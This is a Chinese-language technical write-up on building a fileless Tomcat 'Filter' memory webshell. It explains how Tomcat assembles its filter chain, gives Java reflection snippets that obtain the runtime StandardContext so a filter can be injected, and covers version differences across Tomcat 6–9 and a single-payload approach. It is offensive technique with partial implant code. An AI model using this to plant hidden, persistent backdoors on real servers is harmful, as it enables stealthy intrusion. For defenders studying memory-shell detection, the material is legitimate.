在打入一个内存马之前，需要先了解中间件从接受请求到调用Servlet中间的流程。

调用栈：

 ```java
 doGet:12, A (com)
 service:634, HttpServlet (javax.servlet.http)
 service:741, HttpServlet (javax.servlet.http)
 ...Filter chain
 doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
 ...Valve
 invoke:74, StandardEngineValve (org.apache.catalina.core)
 service:343, CoyoteAdapter (org.apache.catalina.connector)
 service:408, Http11Processor (org.apache.coyote.http11)
 process:66, AbstractProcessorLight (org.apache.coyote)
 ...进入处理线程
 run:748, Thread (java.lang)
 ```

# Filter内存马

直接看Tomcat Filter chain处，

**`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`**

```java
if (pos < n) {
    ApplicationFilterConfig filterConfig = filters[pos++];
    Filter filter = filterConfig.getFilter();
    filter.doFilter(request, response, this);
}
//Filter结束后再去调用Servlet
servlet.service(request, response);
```

Tomcat通过不断的递归调用`internalDoFilter()`来执行所有定义的Filter，这种方式称为Filter chain。实际上每次请求，Tomcat都会组装一遍Filter chain，组装filter chain在**`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`**

```java
ApplicationFilterChain filterChain = null;
StandardContext context = (StandardContext) wrapper.getParent(); //!
FilterMap filterMaps[] = context.findFilterMaps();
for (int i = 0; i < filterMaps.length; i++) {
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) 
        context.findFilterConfig(filterMaps[i].getFilterName());
    filterChain.addFilter(filterConfig);
}
```

filter chain的来源就是`StandardContext`。也就是Tomcat的上下文变量

知道了如何添加filter，还需要知道如何获取运行时的`StandardContext`，以动态添加filter



# Context获取

关于Tomcat Context的获取，已经有很多师傅写出了研究成果，非常感谢师傅们的无私分享~ 在本项目中，暂时是使用`MBeanServer`和`CurrentThread`的方式获取Context。嗯，暂时来说还没遇到啥问题，有空的话再加点其他方式趴（挖坑）

CurrentThread方式

```java
WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
WebResourceRoot resources = contextClassLoader.getResources();
return (StandardContext) resources.getContext();
```

MBeanServer方式

```java
MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
mbsInterceptorField.setAccessible(true);
Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);

Field repositoryField = mbsInterceptor.getClass().getDeclaredField("repository");
repositoryField.setAccessible(true);
Object repository = repositoryField.get(mbsInterceptor);

Field domainTbField = repository.getClass().getDeclaredField("domainTb");
domainTbField.setAccessible(true);
Map domainTb = (Map) domainTbField.get(repository);
Map catalina = (Map) domainTb.get("Catalina");
Object[] set = catalina.keySet().toArray();

WebappLoader webappLoader = null;
for (int i = 0; i < set.length; i++) {
    NamedObject namedObject = (NamedObject) catalina.get(set[i]);
    BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
    webappLoader = (WebappLoader) baseModelMBean.getManagedResource();
    return (StandardContext) webappLoader.getContainer();
}
```



# 大版本的差异

（写的时间隔的有点久233，有些小细节不记得了...）

**Tomcat 6 & Tomcat 7**

* `FilterMap`和`FilterDef`的路径为`org.apache.catalina.deploy`
* 需要调用`org.apache.catalina.loader.WebappLoader#getContainer`获取StandardContext
* .....

**Tomcat 8 & Tomcat 9**

* `FilterMap`和`FilterDef`的路径变更到`org.apache.tomcat.util.descriptor.web`

* 需要调用`org.apache.catalina.loader.WebappLoader#getContext`获取StandardContext
* Tomcat8的`Thread.currentThread().getContextClassLoader();`得到`WebappClassLoader`，而Tomca9得到`ParallelWebappClassLoader`。为了不报错，需要强转成他们的父类`WebappClassLoaderBase`
* ......



**Tomcat 10（未做）**



注：

* **为了实现一个Payload打全版本，本项目以Tomcat 8的jar包为基础，把缺少的类文件（`FilterDef`、`FilterMap`这些路径改了的）从Tomcat 6中拖出来，丢进Tomcat 8的包中，类缺少的方法就用`javassist`生成后替换，确保我用`javassist`生成Payload时能正确生成即可。运行时为了防止因为类不存在而报错，也为了缩减体积，舍去了利用反射和多层`if`判断类名，改用`try catch`的方式来控制程序的流程及报错的抑制。效果还是可以的233**
* **网上看到大多都是直接反射创建`ApplicationFilterConfig`的，但是实际上看源码可以看到 `StandardContext`有`filterStart()`方法，可以直接将`FilterMap`和`FilterDef`加进`FilterConfig`中。可以减小内存马体积。**

# Reference

[基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388)

[关于shiro漏洞利用中key的修改](https://blog.thekingofduck.com/post/TheWayToChangeShiroKey/)

[tomcat不出网回显连续剧第六集](https://xz.aliyun.com/t/7535)